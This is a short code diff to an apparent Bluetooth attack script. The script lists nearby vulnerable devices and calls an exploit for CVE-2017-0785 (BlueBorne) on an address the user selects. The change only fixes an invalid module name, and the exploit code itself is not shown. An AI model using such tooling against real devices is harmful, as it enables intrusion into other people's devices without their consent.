@@ -1,7 +1,7 @@
 import time
 import bluetooth
 import vulndevices
-import CVE-2017-0785
+import cve20170785
 
 deviceMACs = vulndevices.get_devices()
 
@@ -42,7 +42,7 @@ def main():
         try:
             sel = int(selection)
             addr = vuln_devices[sel][0]
-            CVE-2017-0785.exploit(addr)
+            cve20170785.exploit(addr)
 
         except:
             print("Invalid selection")
